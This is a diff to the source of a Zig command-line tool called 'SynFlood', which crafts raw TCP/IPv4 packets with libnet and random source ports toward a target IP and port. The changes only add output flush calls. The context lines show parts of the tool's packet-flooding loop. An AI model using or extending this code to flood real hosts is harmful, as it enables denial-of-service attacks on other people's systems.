@@ -34,12 +34,10 @@ pub fn main() !void {
     var stderr_writer = File.stderr().writer(&stderr_buffer);
     const stderr = &stderr_writer.interface;
 
-    // var stdout = std.io.getStdOut().writer();
-    // var stderr = std.io.getStdErr().writer();
-
     try stdout.print("SynFlood 3.0.0\n", .{});
     try stdout.print("Copyright (C) 2010 Christian Mayer <https://fox21.at>\n", .{});
     try stdout.print("{s}\n", .{c_libnet.libnet_version()});
+    try stdout.flush();
 
     if (args.len == 1) {
         try print_help(stdout);
@@ -86,6 +84,7 @@ pub fn main() !void {
     try stdout.print("destination ip: {s}\n", .{destination_ip_s});
     try stdout.print("destination port: {d}\n", .{destination_port});
     try stdout.print("connections: {d}\n", .{connections});
+    try stdout.flush();
 
     var errbuf: [c_libnet.LIBNET_ERRBUF_SIZE]u8 = undefined;
     const net = c_libnet.libnet_init(c_libnet.LIBNET_RAW4, null, &errbuf[0]);
@@ -104,6 +103,7 @@ pub fn main() !void {
 
     for (0..connections) |c| {
         try stdout.print("connection: {d} ... ", .{c});
+        try stdout.flush();
 
         const src_port: u16 = @intCast(libnet_get_prand(c_libnet.LIBNET_PRu16));
         const src_seq = libnet_get_prand(c_libnet.LIBNET_PRu16);
@@ -123,6 +123,7 @@ pub fn main() !void {
         );
         if (tcp == -1) {
             try stderr.print("\nERROR: libnet_build_tcp: {s}\n", .{c_libnet.libnet_geterror(net)});
+            try stderr.flush();
         }
 
         const ip_id: u16 = @intCast(libnet_get_prand(c_libnet.LIBNET_PRu16));
@@ -140,13 +141,16 @@ pub fn main() !void {
             net, ipv4);
         if (ipv4 == -1) {
             try stderr.print("\nERROR: libnet_build_ipv4: {s}\n", .{c_libnet.libnet_geterror(net)});
+            try stderr.flush();
         }
 
         sock_written = c_libnet.libnet_write(net);
         if (sock_written == -1) {
             try stderr.print("\nERROR: libnet_write: {s}\n", .{c_libnet.libnet_geterror(net)});
+            try stderr.flush();
         }
         try stdout.print("socket written: {d}\n", .{sock_written});
+        try stdout.flush();
     }
 }
 
